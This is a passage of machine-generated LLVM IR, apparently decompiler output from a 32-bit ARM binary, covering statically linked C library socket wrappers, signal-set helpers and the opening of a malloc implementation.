  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15adc = load i32, i32* @r7, align 4
  store i32 %v3_15adc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15b04, label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %entry
  %v0_15af4 = call i32 @__GI___errno_location()
  %v0_15af8 = load i32, i32* %r7.global-to-local, align 4
  %v1_15af8 = sub i32 0, %v0_15af8
  %v2_15afc = inttoptr i32 %v0_15af4 to i32*
  store i32 %v1_15af8, i32* %v2_15afc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15b08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15b04

dec_label_pc_15b04:                               ; preds = %entry, %dec_label_pc_15af4
  %v2_15b08 = phi i32 [ %v3_15adc, %entry ], [ %v2_15b08.pre, %dec_label_pc_15af4 ]
  %v0_15b04 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15af4 ]
  store i32 %v2_15b08, i32* @r7, align 4
  ret i32 %v0_15b04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b04, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b14 = load i32, i32* @r7, align 4
  store i32 %v3_15b14, i32* %stack_var_-8, align 4
  %v0_15b20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15b20, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15b20, -4095
  br i1 %tmp, label %dec_label_pc_15b40, label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %entry
  %v0_15b30 = call i32 @__GI___errno_location()
  %v0_15b34 = load i32, i32* %r7.global-to-local, align 4
  %v1_15b34 = sub i32 0, %v0_15b34
  %v2_15b38 = inttoptr i32 %v0_15b30 to i32*
  store i32 %v1_15b34, i32* %v2_15b38, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15b40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %entry, %dec_label_pc_15b30
  %v1_15b44 = phi i32 [ %v0_15b20, %entry ], [ -1, %dec_label_pc_15b30 ]
  %v2_15b40 = phi i32 [ %v3_15b14, %entry ], [ %v2_15b40.pre, %dec_label_pc_15b30 ]
  store i32 %v2_15b40, i32* @r7, align 4
  ret i32 %v1_15b44

; uselistorder directives
  uselistorder i32 %v0_15b20, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b40, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15b80, label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %entry
  %v0_15b70 = call i32 @__GI___errno_location()
  %v0_15b74 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b74 = sub i32 0, %v0_15b74
  %v2_15b78 = inttoptr i32 %v0_15b70 to i32*
  store i32 %v1_15b74, i32* %v2_15b78, align 4
  br label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %entry, %dec_label_pc_15b70
  %v1_15b88 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15b70 ]
  ret i32 %v1_15b88

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b80, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b90 = load i32, i32* @r7, align 4
  store i32 %v3_15b90, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15bb8, label %dec_label_pc_15ba8

dec_label_pc_15ba8:                               ; preds = %entry
  %v0_15ba8 = call i32 @__GI___errno_location()
  %v0_15bac = load i32, i32* %r7.global-to-local, align 4
  %v1_15bac = sub i32 0, %v0_15bac
  %v2_15bb0 = inttoptr i32 %v0_15ba8 to i32*
  store i32 %v1_15bac, i32* %v2_15bb0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15bbc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15bb8

dec_label_pc_15bb8:                               ; preds = %entry, %dec_label_pc_15ba8
  %v2_15bbc = phi i32 [ %v3_15b90, %entry ], [ %v2_15bbc.pre, %dec_label_pc_15ba8 ]
  %v0_15bb8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15ba8 ]
  store i32 %v2_15bbc, i32* @r7, align 4
  ret i32 %v0_15bb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bb8, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15bc8 = load i32, i32* @r7, align 4
  store i32 %v3_15bc8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15bf0, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %entry
  %v0_15be0 = call i32 @__GI___errno_location()
  %v0_15be4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15be4 = sub i32 0, %v0_15be4
  %v2_15be8 = inttoptr i32 %v0_15be0 to i32*
  store i32 %v1_15be4, i32* %v2_15be8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15bf4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15bf0

dec_label_pc_15bf0:                               ; preds = %entry, %dec_label_pc_15be0
  %v2_15bf4 = phi i32 [ %v3_15bc8, %entry ], [ %v2_15bf4.pre, %dec_label_pc_15be0 ]
  %v0_15bf0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15be0 ]
  store i32 %v2_15bf4, i32* @r7, align 4
  ret i32 %v0_15bf0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bf0, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15c00 = load i32, i32* @r4, align 4
  store i32 %v3_15c00, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15c30, label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %entry
  %v0_15c20 = call i32 @__GI___errno_location()
  %v0_15c24 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c24 = sub i32 0, %v0_15c24
  %v2_15c28 = inttoptr i32 %v0_15c20 to i32*
  store i32 %v1_15c24, i32* %v2_15c28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15c34.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %entry, %dec_label_pc_15c20
  %v2_15c34 = phi i32 [ %v3_15c00, %entry ], [ %v2_15c34.pre, %dec_label_pc_15c20 ]
  %v0_15c30 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15c20 ]
  store i32 %v2_15c34, i32* @r4, align 4
  ret i32 %v0_15c30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15c74, label %dec_label_pc_15c64

dec_label_pc_15c64:                               ; preds = %entry
  %v0_15c64 = call i32 @__GI___errno_location()
  %v0_15c68 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c68 = sub i32 0, %v0_15c68
  %v2_15c6c = inttoptr i32 %v0_15c64 to i32*
  store i32 %v1_15c68, i32* %v2_15c6c, align 4
  br label %dec_label_pc_15c74

dec_label_pc_15c74:                               ; preds = %entry, %dec_label_pc_15c64
  %v1_15c7c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15c64 ]
  ret i32 %v1_15c7c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c74, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15c84 = load i32, i32* @r7, align 4
  store i32 %v3_15c84, i32* %stack_var_-8, align 4
  %v0_15c90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15c90, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15c90, -4095
  br i1 %tmp, label %dec_label_pc_15cb0, label %dec_label_pc_15ca0

dec_label_pc_15ca0:                               ; preds = %entry
  %v0_15ca0 = call i32 @__GI___errno_location()
  %v0_15ca4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15ca4 = sub i32 0, %v0_15ca4
  %v2_15ca8 = inttoptr i32 %v0_15ca0 to i32*
  store i32 %v1_15ca4, i32* %v2_15ca8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15cb0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15cb0

dec_label_pc_15cb0:                               ; preds = %entry, %dec_label_pc_15ca0
  %v1_15cb4 = phi i32 [ %v0_15c90, %entry ], [ -1, %dec_label_pc_15ca0 ]
  %v2_15cb0 = phi i32 [ %v3_15c84, %entry ], [ %v2_15cb0.pre, %dec_label_pc_15ca0 ]
  store i32 %v2_15cb0, i32* @r7, align 4
  ret i32 %v1_15cb4

; uselistorder directives
  uselistorder i32 %v0_15c90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cb0, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_15cbc = load i32, i32* @r4, align 4
  %v0_15cc4 = call i32 @__GI_getpid()
  %v2_15ccc = call i32 @kill(i32 %v0_15cc4, i32 %arg1)
  store i32 %v3_15cbc, i32* @r4, align 4
  ret i32 %v2_15ccc

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_15cf0, label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %entry
  %v7_15cec = icmp slt i32 %arg1, 65
  br i1 %v7_15cec, label %dec_label_pc_15d04, label %dec_label_pc_15cf0

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15ce8, %entry
  %v0_15cf0 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15cfc = inttoptr i32 %v0_15cf0 to i32*
  store i32 22, i32* %v2_15cfc, align 4
  %v0_15d0c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d0c

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15ce8
  %v0_15d04 = call i32 @__sigaddset()
  store i32 %v0_15d04, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d0c

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cf0, %dec_label_pc_15d04
  %v0_15d0c = phi i32 [ %v0_15d0c.pre, %dec_label_pc_15cf0 ], [ %v0_15d04, %dec_label_pc_15d04 ]
  ret i32 %v0_15d0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d0c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_15d24 = add i32 %tmp, 4
  %v3_15d24 = inttoptr i32 %v2_15d24 to i32*
  store i32 0, i32* %v3_15d24, align 4
  %v1_15d28 = load i32, i32* %r3.global-to-local, align 4
  %v2_15d28 = inttoptr i32 %v1_15d28 to i32*
  store i32 0, i32* %v2_15d28, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15d30 = load i32, i32* @r4, align 4
  store i32 %v3_15d30, i32* %stack_var_-16, align 4
  %v6_15d30 = load i32, i32* @r5, align 4
  %v9_15d30 = load i32, i32* @r6, align 4
  %v7_15d38 = icmp eq i32 %arg2, -1
  br i1 %v7_15d38, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_15d40 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_15d5c

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d64

dec_label_pc_15d5c:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  %v7_15d60 = icmp slt i32 %arg1, 65
  br i1 %v7_15d60, label %dec_label_pc_15d78, label %dec_label_pc_15d64

dec_label_pc_15d64:                               ; preds = %.thread16, %dec_label_pc_15d5c
  %v0_15d64 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15d70 = inttoptr i32 %v0_15d64 to i32*
  store i32 22, i32* %v2_15d70, align 4
  %v0_15dd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d5c
  %v2_15d78 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15d78, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_15d80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_15d80, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_15d90 = call i32 @__sigaddset()
  %v0_15d98 = load i32, i32* @r5, align 4
  %v0_15d9c = load i32, i32* @r6, align 4
  %v2_15d9c = add i32 %v0_15d9c, 26588
  %v2_15da0 = call i32 @__GI___sigismember(i32 %v2_15d9c, i32 %v0_15d98)
  store i32 %v2_15d40, i32* %r2.global-to-local, align 4
  %v0_15db8 = load i32, i32* @r5, align 4
  %v3_15dc0 = call i32 @__libc_sigaction(i32 %v0_15db8, i32 %v2_15d78, i32 %v2_15d40)
  %v1_15dc4 = icmp slt i32 %v3_15dc0, 0
  br i1 %v1_15dc4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_15d78
  %v5_15dc8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_15dc8, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_15d78
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_15d64, %bb32
  %v0_15dd0 = phi i32 [ %v5_15dc8, %bb31 ], [ %v0_15dd0.pre, %dec_label_pc_15d64 ], [ -1, %bb32 ]
  %v2_15dd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15dd8, i32* @r4, align 4
  store i32 %v6_15d30, i32* @r5, align 4
  store i32 %v9_15d30, i32* @r6, align 4
  ret i32 %v0_15dd0

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d64, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15de8 = add i32 %arg2, -1
  %v3_15dec = udiv i32 %v1_15de8, 32
  %v4_15df0 = mul nuw nsw i32 %v3_15dec, 4
  %v5_15df0 = add i32 %v4_15df0, %arg1
  %v6_15df0 = inttoptr i32 %v5_15df0 to i32*
  %v7_15df0 = load i32, i32* %v6_15df0, align 4
  %v1_15df4 = urem i32 %v1_15de8, 32
  %v7_15dfc = shl i32 1, %v1_15df4
  %v8_15dfc = and i32 %v7_15df0, %v7_15dfc
  %v10_15dfc = icmp ne i32 %v8_15dfc, 0
  %. = zext i1 %v10_15dfc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_15de8, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_15e0c = load i32, i32* @r1, align 4
  %v1_15e0c = add i32 %v0_15e0c, -1
  %v3_15e10 = udiv i32 %v1_15e0c, 32
  %v0_15e14 = load i32, i32* @r0, align 4
  %v4_15e14 = mul nuw nsw i32 %v3_15e10, 4
  %v5_15e14 = add i32 %v0_15e14, %v4_15e14
  %v6_15e14 = inttoptr i32 %v5_15e14 to i32*
  %v7_15e14 = load i32, i32* %v6_15e14, align 4
  %v1_15e18 = urem i32 %v1_15e0c, 32
  %v7_15e20 = shl i32 1, %v1_15e18
  %v8_15e20 = or i32 %v7_15e14, %v7_15e20
  store i32 %v8_15e20, i32* %v6_15e14, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15e0c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15e30 = add i32 %arg2, -1
  %v3_15e34 = udiv i32 %v1_15e30, 32
  %v4_15e38 = mul nuw nsw i32 %v3_15e34, 4
  %v5_15e38 = add i32 %v4_15e38, %arg1
  %v6_15e38 = inttoptr i32 %v5_15e38 to i32*
  %v7_15e38 = load i32, i32* %v6_15e38, align 4
  %v1_15e3c = urem i32 %v1_15e30, 32
  %tmp = shl i32 -1, %v1_15e3c
  %v8_15e44 = add i32 %tmp, -1
  %v9_15e44 = and i32 %v7_15e38, %v8_15e44
  store i32 %v9_15e44, i32* %v6_15e38, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15e30, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_15e54 = udiv i32 %arg1, 256
  store i32 %v3_15e54, i32* %r1.global-to-local, align 4
  %v2_15e58 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_15e58, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_15e64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15e58, i32 %v0_15e64)
  %v0_15e68 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e68 = add i32 %v0_15e68, 1048320
  %v3_15e6c = udiv i32 %v1_15e68, 65536
  %v1_15e70 = and i32 %v3_15e6c, 8
  %v6_15e74 = shl i32 %v0_15e68, %v1_15e70
  %v1_15e78 = add i32 %v6_15e74, 520192
  %v3_15e7c = udiv i32 %v1_15e78, 65536
  %v1_15e80 = and i32 %v3_15e7c, 4
  %v6_15e84 = shl i32 %v6_15e74, %v1_15e80
  %v1_15e88 = add i32 %v6_15e84, 245760
  %v3_15e8c = udiv i32 %v1_15e88, 65536
  %v1_15e90 = and i32 %v3_15e8c, 2
  %v6_15e94 = shl i32 %v6_15e84, %v1_15e90
  store i32 %v6_15e94, i32* %r1.global-to-local, align 4
  %v1_15e98 = sub nsw i32 13, %v1_15e70
  %v2_15e9c = sub nsw i32 %v1_15e98, %v1_15e80
  %v3_15ea0 = udiv i32 %v6_15e94, 32768
  %v4_15ea0 = sub nuw nsw i32 -1, %v3_15ea0
  %v4_15ea4 = udiv i32 %v6_15e94, 16384
  %v5_15ea4 = and i32 %v4_15ea4, %v4_15ea0
  %v2_15ea8 = sub nsw i32 %v2_15e9c, %v1_15e90
  %v2_15eac = add nsw i32 %v2_15ea8, %v5_15ea4
  %v1_15eb0 = add nsw i32 %v2_15eac, 6
  %v0_15eb4 = load i32, i32* %ip.global-to-local, align 4
  %v6_15eb4 = lshr i32 %v0_15eb4, %v1_15eb0
  %v3_15eb8 = mul nsw i32 %v2_15eac, 4
  %v1_15ebc = add nsw i32 %v3_15eb8, 32
  %v1_15ec0 = urem i32 %v6_15eb4, 4
  %v2_15ec4 = or i32 %v1_15ec0, %v1_15ebc
  ret i32 %v2_15ec4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_15ecc = load i32, i32* @r4, align 4
  %v6_15ecc = load i32, i32* @r5, align 4
  %v9_15ecc = load i32, i32* @r6, align 4
  %v12_15ecc = load i32, i32* @r7, align 4
  %v15_15ecc = load i32, i32* @r8, align 4
  %v18_15ecc = load i32, i32* @sb, align 4
  %v21_15ecc = load i32, i32* @sl, align 4
  %v24_15ecc = load i32, i32* @fp, align 4
  %v27_15ecc = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_15ee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 72) to i32*), align 4
  store i32 %v4_15ee0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_15eec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 36) to i32*), align 4
  store i32 %v4_15eec, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_15ee0, i32* %r2.global-to-local, align 4
  %v2_15ef8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15ef8, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  %v4_15f04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 %v4_15f04, i32* %ip.global-to-local, align 4
  store i32 89872, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15f04)
  %v0_15f10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f10, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_15f1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 16) to i32*), align 4
  store i32 %v4_15f1c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_15f28.976 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15f1c)
  %v0_15f28 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15f28, -32
  br i1 %tmp, label %dec_label_pc_15f44, label %dec_label_pc_15f30

dec_label_pc_15f30:                               ; preds = %entry
  %v0_15f30 = call i32 @__GI___errno_location()
  store i32 %v0_15f30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_15f3c = inttoptr i32 %v0_15f30 to i32*
  store i32 12, i32* %v2_15f3c, align 4
  br label %dec_label_pc_167c0

dec_label_pc_15f44:                               ; preds = %entry
  %v1_15f44 = add i32 %v0_15f28, 11
  store i32 %v1_15f44, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v2_15f50 = icmp ugt i32 %v1_15f44, 14
  %v7_15f50 = icmp eq i32 %v1_15f44, 15
  %v2_15f54 = xor i1 %v7_15f50, true
  %v3_15f54 = and i1 %v2_15f50, %v2_15f54
  br i1 %v3_15f54, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_15f44
  %v5_15f54 = and i32 %v1_15f44, -8
  store i32 %v5_15f54, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_15f44, %bb
  %v4_15f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_15f58, i32* @r0, align 4
  %v1_15f5c = inttoptr i32 %v4_15f58 to i32*
  %v2_15f5c = load i32, i32* %v1_15f5c, align 4
  store i32 %v2_15f5c, i32* @r4, align 4
  %v2_15f60 = xor i1 %v2_15f50, true
  %v3_15f60 = or i1 %v7_15f50, %v2_15f60
  br i1 %v3_15f60, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_15f64 = urem i32 %v2_15f5c, 2
  %v2_15f64 = icmp eq i32 %v1_15f64, 0
  br i1 %v2_15f64, label %dec_label_pc_15f6c, label %dec_label_pc_15f7c

dec_label_pc_15f6c:                               ; preds = %bb140
  %v2_15f6c = icmp eq i32 %v2_15f5c, 0
  br i1 %v2_15f6c, label %dec_label_pc_15f74, label %dec_label_pc_16358

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f6c
  %v0_15f74 = call i32 @__malloc_consolidate()
  store i32 %v0_15f74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16358

dec_label_pc_15f7c:                               ; preds = %bb140
  %v0_15f7c = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_15f7c, %v2_15f5c
  br i1 %tmp201, label %dec_label_pc_15fa4, label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %dec_label_pc_15f7c
  %v1_15f84 = add i32 %v4_15f58, -4
  store i32 %v1_15f84, i32* %r1.global-to-local, align 4
  %v3_15f88 = udiv i32 %v0_15f7c, 8
  store i32 %v3_15f88, i32* %r2.global-to-local, align 4
  %v4_15f8c = mul nuw i32 %v3_15f88, 4
  %v5_15f8c = add i32 %v4_15f8c, %v1_15f84
  %v6_15f8c = inttoptr i32 %v5_15f8c to i32*
  %v7_15f8c = load i32, i32* %v6_15f8c, align 4
  store i32 %v7_15f8c, i32* %r0.global-to-local, align 4
  %v2_15f90 = icmp eq i32 %v7_15f8c, 0
  br i1 %v2_15f90, label %dec_label_pc_15fa4, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15f84
  %v2_15f94 = add i32 %v7_15f8c, 8
  %v3_15f94 = inttoptr i32 %v2_15f94 to i32*
  %v4_15f94 = load i32, i32* %v3_15f94, align 4
  store i32 %v4_15f94, i32* %r3.global-to-local, align 4
  store i32 %v2_15f94, i32* %r0.global-to-local, align 4
  store i32 %v2_15f94, i32* %r4.global-to-local, align 4
  store i32 %v4_15f94, i32* %v6_15f8c, align 4
  br label %dec_label_pc_167a4

